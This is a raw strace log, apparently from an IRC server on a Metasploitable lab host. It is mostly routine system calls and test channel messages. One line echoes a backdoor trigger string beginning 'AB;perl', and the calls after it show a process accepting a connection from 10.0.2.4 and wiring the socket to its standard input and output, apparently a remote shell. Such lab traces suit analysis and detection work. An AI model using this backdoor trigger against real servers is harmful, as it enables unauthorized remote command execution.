11889 07:39:45.260630 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11889 07:39:45.260630 --- SIGCHLD (Child exited) @ 0 (0) ---
11889 07:39:45.260630 waitpid(-1, 0xbfffcb78, WNOHANG) = -1 ECHILD (No child processes)
11889 07:39:45.260639 sigreturn()       = ? (mask now [])
11889 07:39:45.260659 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
11889 07:39:45.260704 exit_group(0)     = ?
4519  07:39:45.260747 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 11889
4519  07:39:45.260759 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:39:45.260774 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:39:45.260785 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:39:45.260795 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:39:45.260813 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:39:45.260878 time(NULL)        = 1495625985
4519  07:39:45.260888 time(NULL)        = 1495625985
4519  07:39:45.260902 gettimeofday({1495625985, 260906}, NULL) = 0
4519  07:39:45.260915 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:39:45.260946 clock_gettime(CLOCK_MONOTONIC, {2795, 77959246}) = 0
4519  07:39:45.260958 gettimeofday({1495625985, 260962}, NULL) = 0
4519  07:39:45.260969 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {1, 0})
4519  07:39:45.261010 clock_gettime(CLOCK_MONOTONIC, {2795, 78023025}) = 0
4519  07:39:45.261022 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 44
4519  07:39:45.261046 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261064 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261078 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261092 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261123 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261139 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261153 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261167 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261180 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261194 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261207 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261221 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261235 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261248 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261261 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261275 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261288 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261302 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261316 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261331 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261345 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261358 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.261377 gettimeofday({1495625985, 261381}, NULL) = 0
4519  07:39:45.261388 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
11892 07:39:45.525584 <... accept resumed> {sa_family=AF_INET, sin_port=htons(39767), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
11892 07:39:45.525670 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5848) = -1 EINVAL (Invalid argument)
11892 07:39:45.525686 _llseek(8, 0, 0xbfeb5890, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11892 07:39:45.525698 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb5848) = -1 EINVAL (Invalid argument)
11892 07:39:45.525709 _llseek(8, 0, 0xbfeb5890, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11892 07:39:45.525719 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
11892 07:39:45.525761 close(6)          = 0
11892 07:39:45.525831 dup(8)            = 6
11892 07:39:45.525851 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb66e8) = -1 EINVAL (Invalid argument)
11892 07:39:45.525862 _llseek(6, 0, 0xbfeb6730, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11892 07:39:45.525872 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
11892 07:39:45.525892 dup2(6, 1)        = 1
11892 07:39:45.525903 close(6)          = 0
11892 07:39:45.525914 fcntl64(1, F_SETFD, 0) = 0
11892 07:39:45.525924 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb66b8) = -1 EINVAL (Invalid argument)
11892 07:39:45.525935 _llseek(1, 0, 0xbfeb6700, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11892 07:39:45.525964 dup(8)            = 6
11892 07:39:45.525976 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeb66e8) = -1 EINVAL (Invalid argument)
11892 07:39:45.525986 _llseek(6, 0, 0xbfeb6730, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11892 07:39:45.525996 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
11892 07:39:45.526012 dup2(6, 0)        = 0
11892 07:39:45.526022 close(6)          = 0
11892 07:39:45.526032 fcntl64(0, F_SETFD, 0) = 0
11892 07:39:45.526045 fcntl64(0, F_SETFD, 0) = 0
11892 07:39:45.526061 read(0,  <unfinished ...>
4519  07:39:45.526408 <... select resumed> ) = 1 (in [5], left {0, 740000})
4519  07:39:45.526432 clock_gettime(CLOCK_MONOTONIC, {2795, 343446128}) = 0
4519  07:39:45.526447 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:39:45.526460 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:39:45.526482 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:39:45.526498 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:39:45.526532 close(5)          = 0
4519  07:39:45.526548 time(NULL)        = 1495625985
4519  07:39:45.526567 time(NULL)        = 1495625985
4519  07:39:45.526580 gettimeofday({1495625985, 526583}, NULL) = 0
4519  07:39:45.526620 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:39:45.526664 clock_gettime(CLOCK_MONOTONIC, {2795, 343676635}) = 0
4519  07:39:45.526674 gettimeofday({1495625985, 526678}, NULL) = 0
4519  07:39:45.526685 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 650000})
4519  07:39:45.870590 clock_gettime(CLOCK_MONOTONIC, {2795, 687598925}) = 0
4519  07:39:45.870590 recv(7, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:39:45.870590 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870590 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870591 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870591 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870591 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870591 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870592 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870596 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870610 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870624 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870637 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870651 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870665 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870678 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870692 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870705 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870719 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870733 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870754 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870768 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870781 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870804 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.870821 gettimeofday({1495625985, 870825}, NULL) = 0
4519  07:39:45.870833 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 980000})
4519  07:39:45.890629 clock_gettime(CLOCK_MONOTONIC, {2795, 707638549}) = 0
4519  07:39:45.890630 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 70
4519  07:39:45.890630 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890630 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890630 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890631 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890631 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890631 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890631 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890631 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890632 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890632 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890632 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890638 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890652 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890665 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890679 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890692 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890706 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890719 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890733 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890747 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890760 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890785 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.890800 time(NULL)        = 1495625985
4519  07:39:45.890810 time(NULL)        = 1495625985
4519  07:39:45.890821 gettimeofday({1495625985, 890825}, NULL) = 0
4519  07:39:45.890832 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:39:45.890861 clock_gettime(CLOCK_MONOTONIC, {2795, 707873551}) = 0
4519  07:39:45.890871 gettimeofday({1495625985, 890875}, NULL) = 0
4519  07:39:45.890882 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
11892 07:39:46.046453 <... read resumed> "", 4096) = 0
11892 07:39:46.046594 close(8)          = 0
11892 07:39:46.046735 exit_group(0)     = ?
